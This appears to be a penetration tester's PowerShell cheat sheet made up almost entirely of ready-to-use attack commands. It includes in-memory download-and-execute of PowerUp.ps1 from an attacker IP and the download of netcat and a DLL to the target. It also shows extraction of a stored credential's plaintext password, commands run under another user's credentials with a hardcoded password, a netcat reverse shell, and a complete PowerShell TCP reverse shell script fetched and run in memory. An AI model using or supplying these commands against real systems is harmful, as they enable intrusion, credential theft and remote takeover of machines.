from cmd / execute in memory
powershell -exec bypass -c iex(new-object net.webclient).downloadstring('http://10.10.1.1:8000/PowerUp.ps1');invoke-allchecks

from cmd download file and save to dir
powershell -exec bypass -c Invoke-WebRequest -Uri "http://10.10.1.1:8000/nc64.exe" -OutFile "C:\tmp\nc64.exe"  
  
Same as above but shorthand / good for char limits:
powershell iwr http://10.10.1.1:8000/d.dll -outfile  C:\users\administrator\Documents\d.dll

Get network cred:  
$a = Get-Content C:\Users\admin\Desktop\pass.xml | ConvertTo-SecureString
$b = (New-Object PSCredential "administrator",$a).GetNetworkCredential().Password    

ghetto runas credssp
$user = 'DOMAIN\Administrator'
$pass = ConvertTo-SecureString -String "p@55w0rd!" -AsPlainText -Force
$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ($user,$pass)                                                                                           
$s = New-PSSession -ComputerName PC-01 -Credential $cred -Authentication CredSSP                                                                                                          
Invoke-Command -Session $s -ScriptBlock {whoami}

ghetto run as plain
$username = "CORP\username"
$password = "p@55w0rd!"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
Invoke-Command -ScriptBlock {C:\inetpub\wwwroot\nc 10.10.10.1 4445 -e cmd} -Credential $cred -Computer localhost

reverse TCP shell:
shell.ps1 contents:
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.1",4445);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
 invoke shell.ps1 in mem:
 powershell -V 2 -c "IEX(New-object net.webclient).downloadstring('http://10.10.10.1:8000/shell.ps1')"
